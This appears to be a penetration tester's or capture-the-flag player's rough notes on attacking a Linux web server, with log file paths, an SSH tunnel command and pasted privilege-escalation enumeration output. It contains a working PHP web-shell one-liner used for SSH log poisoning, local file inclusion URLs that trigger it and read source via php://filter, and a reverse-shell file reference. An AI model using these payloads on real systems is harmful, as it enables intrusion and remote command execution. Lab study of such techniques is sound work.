-	ssh
				-	ftp
				-	apache
				-	/etc/passwd
			>	knockd


rmeshchojn@gmail.com



##	Identify SELenix

-	.[period in the last directory] [ls -lha]


##	ssh tunnelling

-	ssh jimmy@10.10.10.171 -L 52846:localhost:52846

##	Read apache docs 

-	/etc/apache2/sites-enabled
-	/var/log/apache2/useragent.log
-	`/var/log/apache2/access.log`	[Important]	
-	/etc/apache2/apache2.conf
-	/var/log/apache2
-	/var/log/auth.Logs	[SSH-Logs]
-	/var/log/auth.log

>	 ssh '<?php system($_GET['c']); ?>'@192.168.171.80
>	http://192.168.171.80/console/file.php?file=/var/log/auth.log&c=whoami

'<?php system($_GET['cmd']); ?>'
##	FTP Logs locations
/var/log/vsftpd.log 
/etc/vsftpd.conf
/var/ftp/pub/php_reverse_shell.php

##	Password Generation

cewl http://10.129.95.225/ > wordlist


##	LFI

>	192.168.211.80/console/file.php?file=php://filter/convert.base64-encode/resource=/var/www/html/console/file.php











╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root adm 0 Sep 14  2020 /var/log/apport.log
-rw-r----- 1 root adm 0 Sep 14  2020 /var/log/apport.log.1
-rw-r----- 1 root adm 0 Sep 14  2020 /var/log/apache2/other_vhosts_access.log
-rw-r----- 1 root adm 0 Sep 14  2020 /var/log/apache2/access.log.1
-rw-r----- 1 root adm 25737776 Oct 13 17:16 /var/log/apache2/access.log
-rw-r----- 1 root adm 4666877 Oct 13 17:18 /var/log/apache2/error.log
-rw-r----- 1 root adm 0 Sep 14  2020 /var/log/apache2/error.log.1
-rw-r----- 1 root adm 0 Sep 14  2020 /var/log/apt/term.log
-rw-r----- 1 root dip 656 Jul 31  2020 /snap/core/9804/etc/chatscripts/provider
-rw-r----- 1 root dip 1093 Jul 31  2020 /snap/core/9804/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Jul 31  2020 /snap/core/9804/var/log/dmesg
-rw-r----- 1 root adm 31 Jul 31  2020 /snap/core/9804/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Jul 31  2020 /snap/core/9804/var/log/fsck/checkroot
-rw-r----- 1 root dip 656 Dec  6  2019 /snap/core/8268/etc/chatscripts/provider
-rw-r----- 1 root dip 1093 Dec  6  2019 /snap/core/8268/etc/ppp/peers/provider
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/dmesg
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/fsck/checkfs
-rw-r----- 1 root adm 31 Dec  6  2019 /snap/core/8268/var/log/fsck/checkroot

